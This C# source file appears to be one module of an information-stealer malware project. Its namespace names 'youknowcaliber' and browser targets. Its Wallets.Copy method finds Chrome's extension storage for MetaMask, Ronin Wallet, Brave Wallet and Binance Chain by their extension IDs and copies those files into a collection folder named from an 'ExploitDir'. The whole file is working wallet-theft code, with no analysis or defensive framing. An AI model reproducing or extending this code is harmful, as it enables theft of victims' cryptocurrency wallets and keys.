using System.Collections.Generic;
using System.IO;
using System;

namespace youknowcaliber.Targets.Браузеры.Targets.Browsers.Chromium
{
    class Wallets
    {
        public static void Copy()
        {
            string logdir = Help.ExploitDir + "\\Wallets";
            string extpath = $"{Paths.lappdata}\\Google\\Chrome\\User Data\\Default\\Local Extension Settings";

            List<List<string>> exts = new List<List<string>>();
            exts.Add(new List<string> { "Metamask", "nkbihfbeogaeaoehlefnkodbefgpgknn" });
            exts.Add(new List<string> { "RoninWallet", "fnjhmkhhmkbjkkabndcnnogagogbneec" });
            exts.Add(new List<string> { "BraveWallet", "odbfpeeihdkbihmopkbjmoonfanlbfcl" });
            exts.Add(new List<string> { "BinanceChain", "fhbohimaelbohpjbbldcngcnapndodjp" });

            if (Directory.Exists(extpath))
            {
                if (!Directory.Exists(logdir))
                {
                    Directory.CreateDirectory(logdir);
                }
                foreach (List<string> ext in exts)
                {
                    try
                    {
                        string extdir = $"{extpath}\\{ext[1]}";
                        string logextdir = $"{logdir}\\{ext[0]}";
                        if (Directory.Exists(extdir))
                        {
                            if (!Directory.Exists(logextdir))
                            {
                                Directory.CreateDirectory(logextdir);
                                string[] extfiles = Directory.GetFiles(extdir);
                                foreach (string extfile in extfiles)
                                {
                                    string filename = Path.GetFileName(extfile);
                                    File.Copy(extfile, $"{logextdir}\\{filename}");
                                }
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
                }
            }
        }
    }
}
